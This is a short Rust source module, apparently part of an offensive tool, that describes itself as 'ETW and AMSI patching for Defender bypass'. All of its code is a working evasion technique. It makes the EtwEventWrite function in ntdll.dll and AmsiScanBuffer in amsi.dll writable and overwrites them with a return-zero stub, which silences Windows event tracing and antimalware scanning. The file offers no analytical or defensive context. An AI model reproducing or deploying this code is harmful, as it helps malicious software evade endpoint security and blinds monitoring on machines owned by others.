//evasion.rs
//ETW and AMSI patching for Defender bypass
//Author: wanmywann

use std::ffi::CString;
use windows::{
    core::PCSTR,
    Win32::{
        System::{
            LibraryLoader::{GetModuleHandleA, GetProcAddress},
            Memory::{PAGE_EXECUTE_READWRITE, VirtualProtect},
        },
    },
};

use crate::logger::log_ok;

fn patch_function(module: &str, func: &str, patch_bytes: &[u8]) {
    unsafe {
        let module_cstr = CString::new(module).unwrap();
        let func_cstr = CString::new(func).unwrap();

        let h_module = match GetModuleHandleA(PCSTR(module_cstr.as_ptr() as *const u8)) {
            Ok(h) => h,
            Err(_) => return,
        };

        let func_addr = match GetProcAddress(h_module, PCSTR(func_cstr.as_ptr() as *const u8)) {
            Some(addr) => addr as *mut u8,
            None => return,
        };

        let mut old_protect = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
        let addr_ptr = func_addr as *mut ::core::ffi::c_void;

        let _ = VirtualProtect(
            addr_ptr,
            patch_bytes.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        );

        std::ptr::copy_nonoverlapping(
            patch_bytes.as_ptr(),
            func_addr,
            patch_bytes.len(),
        );

        let _ = VirtualProtect(
            addr_ptr,
            patch_bytes.len(),
            old_protect,
            &mut old_protect,
        );
    }
}

/// Patch EtwEventWrite in ntdll.dll - prevents ETW telemetry
/// xor eax, eax; ret = 33 C0 C3
pub fn patch_etw() {
    let patch: [u8; 3] = [0x33, 0xC0, 0xC3];
    patch_function("ntdll.dll", "EtwEventWrite", &patch);
    log_ok("ETW patched (EtwEventWrite)");
}

/// Patch AmsiScanBuffer in amsi.dll - disables AMSI
/// xor eax, eax; ret = 33 C0 C3
pub fn patch_amsi() {
    let patch: [u8; 3] = [0x33, 0xC0, 0xC3];
    patch_function("amsi.dll", "AmsiScanBuffer", &patch);
    log_ok("AMSI patched (AmsiScanBuffer)");
}
